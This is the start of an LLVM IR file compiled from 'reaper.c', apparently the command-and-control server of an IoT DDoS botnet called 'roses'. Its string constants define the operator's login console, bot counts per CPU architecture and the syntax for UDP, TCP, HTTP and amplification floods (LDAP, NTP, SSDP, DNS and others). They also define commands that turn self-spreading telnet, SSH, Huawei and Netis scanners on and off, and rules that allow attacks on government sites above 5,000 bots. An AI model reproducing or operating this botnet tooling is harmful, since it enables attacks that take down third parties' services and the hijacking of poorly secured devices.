; ModuleID = 'reaper.c'
source_filename = "reaper.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8, i8, i8, i8, i8, i8, i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.in_addr = type { i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.2 = private unnamed_addr constant [8 x i8] c"\1B[1;35m\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@DUPESDELETED = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"~ SC ON\0A\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.9 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mx86_64\1B[1;37m]\00", align 1
@.str.10 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mx86_32\1B[1;37m]\00", align 1
@.str.11 = private unnamed_addr constant [105 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mMIPS\1B[1;37m]\00", align 1
@.str.12 = private unnamed_addr constant [105 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mMPSL\1B[1;37m]\00", align 1
@.str.13 = private unnamed_addr constant [105 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mARM4\1B[1;37m]\00", align 1
@.str.14 = private unnamed_addr constant [105 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mARM5\1B[1;37m]\00", align 1
@.str.15 = private unnamed_addr constant [105 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mARM6\1B[1;37m]\00", align 1
@.str.16 = private unnamed_addr constant [105 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mARM7\1B[1;37m]\00", align 1
@.str.17 = private unnamed_addr constant [104 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mPPC\1B[1;37m]\00", align 1
@.str.18 = private unnamed_addr constant [104 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mDevices Loading \1B[1;37m[\1B[0;31mBUILD\1B[1;37m] ~> [\1B[0;31mSPC\1B[1;37m]\00", align 1
@.str.19 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.21 = private unnamed_addr constant [61 x i8] c"%c]0; roses v2 | IoT Devices: %d | Malware Enthusiast: %d %c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.22 = private unnamed_addr constant [10 x i8] c"roses.txt\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.24 = private unnamed_addr constant [29 x i8] c"[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.27 = private unnamed_addr constant [33 x i8] c"\0AIP:[\1B[0;36m%d.%d.%d.%d\1B[1;37m] \00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@accounts = internal global [50 x %struct.account] zeroinitializer, align 16
@.str.30 = private unnamed_addr constant [24 x i8] c"\1B[0;31mUsername\1B[1;37m:\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.32 = private unnamed_addr constant [24 x i8] c"\1B[0;31mPassword\1B[1;37m:\00", align 1
@.str.33 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.34 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [148 x i8] c"\1B[31mRed roses \1B[37mon my grave bury me with \1B[31m art\1B[37m and some \1B[31mbackwoods and a \1B[31mlighter \1B[37mjust so i could spark midnight rider \0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [45 x i8] c"\1B[31mnever \1B[37mput the car in park   Y88b\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"\1B[0;31m\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [38 x i8] c"\1B[0;31m                            \0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [21 x i8] c"\1B[1;37m[%s@roses ~]#\00", align 1
@.str.41 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"BOTCOUNT\00", align 1
@.str.45 = private unnamed_addr constant [6 x i8] c"COUNT\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.47 = private unnamed_addr constant [46 x i8] c"\1B[0;31mroses.mips \1B[1;37m[\1B[0;31m%d\1B[1;37m]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [46 x i8] c"\1B[0;31mroses.arm  \1B[1;37m[\1B[0;31m%d\1B[1;37m]\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [46 x i8] c"\1B[0;31mroses.sh4  \1B[1;37m[\1B[0;31m%d\1B[1;37m]\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [46 x i8] c"\1B[0;31mroses.ppc  \1B[1;37m[\1B[0;31m%d\1B[1;37m]\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [46 x i8] c"\1B[0;31mroses.x86  \1B[1;37m[\1B[0;31m%d\1B[1;37m]\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [46 x i8] c"\1B[0;31mroses.spc  \1B[1;37m[\1B[0;31m%d\1B[1;37m]\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [46 x i8] c"\1B[0;31mroses.ttl  \1B[1;37m[\1B[0;31m%d\1B[1;37m]\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [61 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37m\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.58 = private unnamed_addr constant [66 x i8] c"Resolved \1B[1;37m[\1B[0;31m%s\1B[1;37m] to \1B[1;37m[\1B[0;31m%s\1B[1;37m]\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [60 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.61 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.62 = private unnamed_addr constant [23 x i8] c"echo '%s' >> roses.txt\00", align 1
@.str.63 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.64 = private unnamed_addr constant [92 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.68 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]All Commands\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [44 x i8] c"\1B[0;37m[\1B[1;31mClear Screen         CLEAR\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [45 x i8] c"\1B[1;37m[\1B[1;31mLOGOUT               LOGOUT\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;31mUsable Ports         PORTS\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;31mRules                RULES\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;31mSpoofing Methods     SPOOF\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [46 x i8] c"\1B[1;37m[\1B[0;31mSpecial Commands     SPECIAL\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;31mScanning Commands    ROSES\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [45 x i8] c"\1B[1;37m[\1B[1;31mStressing Commands   STRESS\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"stress\00", align 1
@.str.80 = private unnamed_addr constant [5 x i8] c"ddos\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.82 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m] Method Listings\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[0;31mLayer4 UDP\1B[1;37m]               L4UDP  \0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[0;31mLayer4 TCP\1B[1;37m]               L4TCP  \0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [60 x i8] c"\1B[1;37m[\1B[0;31mLayer4 Spoofing\1B[1;37m]          L4SPOOF  \0D\0A\00", align 1
@.str.86 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[0;31mLayer7\1B[1;37m]                   L7  \0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"L4UDP\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"l4udp\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"l4UDP\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"L4udp\00", align 1
@.str.91 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m] Layer 4 UDP Listing\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.92 = private unnamed_addr constant [114 x i8] c"\1B[1;37m[\1B[0;31mUDP Flood\1B[1;37m]    !* UDP  [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 0 1\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[0;31mSTD Flood\1B[1;37m]    !* STD  [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[0;31mHOLD Flood\1B[1;37m]   !* HOLD [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[0;31mJUNK Flood\1B[1;37m]   !* JUNK [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[0;31mCNC Flood\1B[1;37m]    !* CNC  [\1B[0;31mIP\1B[1;37m] [\1B[0;31mADMIN PORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [6 x i8] c"L4TCP\00", align 1
@.str.98 = private unnamed_addr constant [6 x i8] c"l4tcp\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"l4TCP\00", align 1
@.str.100 = private unnamed_addr constant [6 x i8] c"L4tcp\00", align 1
@.str.101 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m] Layer 4 TCP Listing\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-ALL Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 ALL 0 1\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-SYN Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 SYN 0 1\0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-FIN Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 FIN 0 1\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-RST Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 RST 0 1\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-PSH Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 PSH 0 1\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-CRI Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 CRI 0 1\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-PRO Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 PRO 0 1\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[0;31mTCP-ACK Flood\1B[1;37m]  !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 ACK 0 1\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[0;31mTCP-XMAS Flood\1B[1;37m] !* TCP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m] 32 XMAS 0 1\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [3 x i8] c"L7\00", align 1
@.str.112 = private unnamed_addr constant [3 x i8] c"l7\00", align 1
@.str.113 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m] Layer 7 Method Listing\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.114 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[0;31mHTTP Flood\1B[1;37m]   !* HTTP  [\1B[0;31mURL\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.115 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[0;31mWGET Flood\1B[1;37m]   !* WGET  [\1B[0;31mURL\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [6 x i8] c"EXTRA\00", align 1
@.str.117 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]UDP Methods\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [66 x i8] c"\1B[0;37mNo Hitting Government Sites Unless Bot count is above 5k\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [31 x i8] c"\1B[0;37mMax TIme =\1B[0;31m1000\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [45 x i8] c"\1B[0;37mThat Does Not Mean Spam \1B[0;31m1000\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [91 x i8] c"\1B[0;37mIf Someone Is Pissing You off Just do \1B[0;31m100\1B[1;37m-\1B[0;31m600\1B[1;37m Seconds\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [6 x i8] c"roses\00", align 1
@.str.123 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]Scanner Commands\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.124 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[0;31mTelnet Scanner\1B[1;37m]  -  !* SCANNER \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.125 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;32mSSH\1B[1;37m] - !* SSH \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.126 = private unnamed_addr constant [85 x i8] c"\1B[1;37m[\1B[1;33mHuawei Scanner\1B[1;37m] - !* HUAWEI \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.127 = private unnamed_addr constant [75 x i8] c"\1B[1;37m[\1B[1;34mNetis\1B[1;37m] - !* NETIS \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.128 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]Selfrep Commands\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.129 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[0;31mTelnet Selfrep\1B[1;37m] - !* SELFTEL \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.130 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[1;32mSSH Selfrep\1B[1;37m] - !* SSHTEL \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.131 = private unnamed_addr constant [81 x i8] c"\1B[1;37m[1;33mHuawei Selfrep\1B[1;37m] - !* HTEL \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.132 = private unnamed_addr constant [82 x i8] c"\1B[1;37m[1;34mNETIS Selfrep\1B[1;37m] - !* NETTEL \1B[1;32mON \1B[1;37m|| \1B[0;31mOFF  \0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [6 x i8] c"RULES\00", align 1
@.str.134 = private unnamed_addr constant [56 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]RULES\1B[1;37m[\1B[0;31m+\1B[1;37m]\0D\0A\00", align 1
@.str.135 = private unnamed_addr constant [46 x i8] c"\1B[1;37m[\1B[1;31m1\1B[1;37m] - No Rapid Booting\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [46 x i8] c"\1B[1;37m[\1B[1;32m2\1B[1;37m] - No Sharing Users\0D\0A\00", align 1
@.str.137 = private unnamed_addr constant [48 x i8] c"\1B[1;37m[\1B[0;33m3\1B[1;37m] - No Going Over Time\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[0;34m4\1B[1;37m] - No Using Scanner Commands\0D\0A\00", align 1
@.str.139 = private unnamed_addr constant [81 x i8] c"\1B[1;37m[\1B[0;35m5\1B[1;37m] - No Hitting Government Sites Unless Bots are over 5k\0D\0A\00", align 1
@.str.140 = private unnamed_addr constant [6 x i8] c"PORTS\00", align 1
@.str.141 = private unnamed_addr constant [56 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]PORTS\1B[1;37m[\1B[0;31m+\1B[1;37m]\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[0;31m22\1B[1;37m] \1B[1;37m- SSH\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32m23\1B[1;37m] \1B[1;37m- Telnet Protocol\0D\0A\00", align 1
@.str.144 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[1;33m50\1B[1;37m] \1B[1;37m- Remote Mail Checking Protocol\0D\0A\00", align 1
@.str.145 = private unnamed_addr constant [42 x i8] c"\1B[1;37m[\1B[1;34m80\1B[1;37m] \1B[1;37m- HTTP\0D\0A\00", align 1
@.str.146 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[1;35m69\1B[1;37m] \1B[1;37m- Trivial File Transfer Protocol\0D\0A\00", align 1
@.str.147 = private unnamed_addr constant [66 x i8] c"\1B[1;37m[\1B[1;36m77\1B[1;37m] \1B[1;37m- Any Private Remote Job Entry\0D\0A\00", align 1
@.str.148 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[0;31m666\1B[1;37m] \1B[1;37m- Doom\0D\0A\00", align 1
@.str.149 = private unnamed_addr constant [61 x i8] c"\1B[1;37m[\1B[1;32m995\1B[1;37m] \1B[1;37m- good for NFO, OVH, VPN\0D\0A\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"L4SPOOF\00", align 1
@.str.151 = private unnamed_addr constant [8 x i8] c"l4spoof\00", align 1
@.str.152 = private unnamed_addr constant [8 x i8] c"l4SPOOF\00", align 1
@.str.153 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]Spoofing Commands\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.154 = private unnamed_addr constant [112 x i8] c"\1B[1;37m[\1B[1;31mLDAP Flood\1B[1;37m]     !* LDAP    [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.155 = private unnamed_addr constant [112 x i8] c"\1B[1;37m[\1B[1;32mNTP Flood\1B[1;37m]      !* NTP     [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.156 = private unnamed_addr constant [112 x i8] c"\1B[1;37m[\1B[1;33mSSDP Flood\1B[1;37m]     !* SSDP    [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.157 = private unnamed_addr constant [112 x i8] c"\1B[1;37m[\1B[1;34mDNS Flood\1B[1;37m]      !* DNS     [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.158 = private unnamed_addr constant [110 x i8] c"\1B[1;37m[\1B[1;35mroses Flood\1B[1;37m]   !* roses  [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.159 = private unnamed_addr constant [112 x i8] c"\1B[1;37m[\1B[1;36mMSSQL Flood\1B[1;37m]    !* MSSQL   [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.160 = private unnamed_addr constant [112 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP Flood\1B[1;37m]  !* PORTMAP [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.161 = private unnamed_addr constant [112 x i8] c"\1B[1;37m[\1B[1;32mTS3 Flood\1B[1;37m]      !* TS3     [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.162 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL Flood\1B[1;37m] !* SENTINEL [\1B[0;31mIP\1B[1;37m] [\1B[0;31mPORT\1B[1;37m] [\1B[0;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.163 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]Reflection Listing\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[0;31mLDAP\1B[1;37m]:\1B[1;31m 0 \0D\0A\00", align 1
@.str.165 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mNTP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.166 = private unnamed_addr constant [40 x i8] c"\1B[1;37m[\1B[1;33mSSDP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.167 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;34mDNS\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.168 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;35mroses\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.169 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;36mMSSQL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.170 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[0;31mPORTMAP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.171 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mTS3\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.172 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.173 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.174 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[0;31m+\1B[1;37m]Special Commands\1B[1;37m[\1B[0;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.175 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mAdds User\1B[1;37m]         adduser   [\1B[0;31mUSER\1B[1;37m] [\1B[0;31mPASS\1B[1;37m]\0D\0A\00", align 1
